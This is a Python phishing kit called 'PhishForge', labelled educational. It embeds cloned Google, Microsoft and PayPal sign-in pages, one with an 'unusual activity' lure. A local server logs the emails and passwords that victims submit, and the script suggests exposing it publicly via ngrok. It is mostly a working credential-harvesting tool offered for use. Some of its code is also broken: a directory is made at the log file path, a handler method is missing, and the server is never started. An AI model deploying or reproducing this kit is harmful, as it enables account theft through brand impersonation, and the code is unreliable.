#!/usr/bin/env python3
"""
PhishForge: A Terminal-Based Phishing Simulation Toolkit
Author: DeepHat
Purpose: Educational security testing to analyze user behavior and credential handling.
"""

import os
import sys
import webbrowser
import argparse
import json
import time
import random
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading

# --- Configuration ---
CONFIG = {
    "listen_host": "0.0.0.0",
    "listen_port": 8080,
    "log_file": "logs/captures.log",
    "template_dir": "templates"
}

# --- HTML Templates ---
# These are embedded to ensure the tool works without external files.
TEMPLATES = {
    "google": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Account - Sign in</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 100%; max-width: 400px; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border-radius: 8px; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { color: #757575; font-size: 14px; margin-bottom: 24px; }
        .input-group { margin-bottom: 16px; text-align: left; }
        label { display: block; font-size: 14px; color: #202124; margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .btn { background-color: #1a73e8; color: white; border: none; border-radius: 4px; padding: 12px 24px; font-size: 14px; cursor: pointer; width: 100%; margin-top: 16px; }
        .btn:hover { background-color: #1557b0; }
        .footer { margin-top: 24px; font-size: 12px; color: #757575; }
        .footer a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/capture" method="POST">
            <div class="input-group">
                <label for="email">Email or phone</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Next</button>
        </form>
        <div class="footer">
            <a href="#">Create account</a> | <a href="#">Privacy</a> | <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
""",
    "microsoft": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Microsoft account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 100%; max-width: 400px; padding: 40px; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-radius: 8px; text-align: center; }
        .logo { width: 120px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 400; color: #323130; margin-bottom: 8px; }
        p { color: #605e5c; font-size: 14px; margin-bottom: 24px; }
        .input-group { margin-bottom: 16px; text-align: left; }
        label { display: block; font-size: 14px; color: #323130; margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #8a8886; border-radius: 2px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border-color: #0078d7; box-shadow: 0 0 0 2px rgba(0,120,215,0.2); }
        .btn { background-color: #0078d7; color: white; border: none; border-radius: 2px; padding: 12px 24px; font-size: 14px; cursor: pointer; width: 100%; margin-top: 16px; }
        .btn:hover { background-color: #005a9e; }
        .footer { margin-top: 24px; font-size: 12px; color: #605e5c; }
        .footer a { color: #0078d7; text-decoration: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" alt="Microsoft Logo" class="logo">
        <h1>Sign in</h1>
        <p>Use your Microsoft account</p>
        <form action="/capture" method="POST">
            <div class="input-group">
                <label for="email">Email, phone, or Skype</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Sign in</button>
        </form>
        <div class="footer">
            <a href="#">Create an account</a> | <a href="#">Privacy</a> | <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
""",
    "paypal": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal - Access Your Account</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #e5e5e5; border-radius: 8px; text-align: center; }
        .logo { width: 150px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 600; color: #003087; margin-bottom: 8px; }
        p { color: #333; font-size: 14px; margin-bottom: 24px; }
        .input-group { margin-bottom: 16px; text-align: left; }
        label { display: block; font-size: 14px; color: #333; margin-bottom: 8px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border-color: #0070ba; box-shadow: 0 0 0 2px rgba(0,112,186,0.2); }
        .btn { background-color: #0070ba; color: white; border: none; border-radius: 4px; padding: 12px 24px; font-size: 14px; cursor: pointer; width: 100%; margin-top: 16px; }
        .btn:hover { background-color: #004c8c; }
        .footer { margin-top: 24px; font-size: 12px; color: #666; }
        .footer a { color: #0070ba; text-decoration: none; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.paypal.com/digitalassets/img/branding/paypal-logo.svg" alt="PayPal Logo" class="logo">
        <h1>Access Your Account</h1>
        <p>We noticed unusual activity. Please verify your identity.</p>
        <form action="/capture" method="POST">
            <div class="input-group">
                <label for="email">Email or PayPal ID</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Continue</button>
        </form>
        <div class="footer">
            <a href="#">Forgot Password?</a> | <a href="#">Security</a>
        </div>
    </div>
</body>
</html>
"""
}

class PhishForge:
    def __init__(self, template="google", port=8080):
        self.template = template
        self.port = port
        self.captures = []
        os.makedirs(CONFIG["log_file"], exist_ok=True)
        os.makedirs(CONFIG["template_dir"], exist_ok=True)

    def _get_template(self):
        """Return the HTML content for the selected template."""
        return TEMPLATES.get(self.template, TEMPLATES["google"])

    def _generate_short_link(self):
        """Generate a random, realistic-looking path."""
        paths = [
            "/account/verify",
            "/security/reset",
            "/login",
            "/portal/auth",
            "/update-password",
            "/secure-session",
            "/identity-check"
        ]
        return random.choice(paths)

    def _get_local_ip(self):
        """Get the local IP address for LAN testing."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def start_server(self):
        """Start the local HTTP server."""
        class PhishHandler(BaseHTTPRequestHandler):
            def _log_capture(self, data):
                log_entry = {
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": self.client_address[0],
                    "path": self.path,
                    "data": data
                }
                with open(CONFIG["log_file"], "a") as f:
                    f.write(json.dumps(log_entry) + "\n")
                print(f"\n[CAPTURE] {self.client_address[0]} - {self.path}")
                for key, value in data.items():
                    print(f"  {key}: {value}")
                print("-" * 40)

            def do_GET(self):
                # Log GET request
                self._log_capture({})
                
                # Serve the template
                content = self._get_template()
                # Replace domain placeholders with the actual host
                host = self.headers.get("Host", "localhost")
                content = content.replace("{{DOMAIN}}", host)
                
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(content.encode())

            def do_POST(self):
                # Capture POST data
                content_length = int(self.headers.get("Content-Length", 0))
                post_data = self.rfile.read(content_length).decode("utf-8")
                parsed_data = parse_qs(post_data)
                flat_data = {k: v[0] for k, v in parsed_data.items()}
                
                self._log_capture(flat_data)
                
                # Redirect to a success page
                self.send_response(302)
                self.send_header("Location", "/success")
                self.end_headers()

            def log_message(self, format, *args):
                pass # Suppress default logging

        server_address = (CONFIG["listen_host"], self.port)
        httpd = HTTPServer(server_address, PhishHandler)
        print(f"[INFO] PhishForge Server listening on http://{server_address[0]}:{server_address[1]}")
        return httpd

    def run(self):
        print("=== PhishForge: Phishing Simulation Toolkit ===")
        print(f"Template: {self.template} | Port: {self.port}")
        
        # Start the server
        httpd = self.start_server()
        
        # Generate links
        local_ip = self._get_local_ip()
        path = self._generate_short_link()
        
        print("\n=== Generated Phishing Links ===")
        print(f"1. Local:  http://localhost:{self.port}{path}")
        print(f"2. LAN:    http://{local_ip}:{self.port}{path}")
        print(f"3. Public: Use ngrok/cloudflared to expose this port")
        
        print("\n[INFO] Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[INFO] Shutting down PhishForge...")
            httpd.shutdown()
            sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PhishForge: Terminal Phishing Simulation Toolkit")
    parser.add_argument("--template", type=str, default="google", choices=["google", "microsoft", "paypal"], help="Template to use")
    parser.add_argument("--port", type=int, default=8080, help="Port to listen on")
    args = parser.parse_args()
    
    pf = PhishForge(template=args.template, port=args.port)
    pf.run()
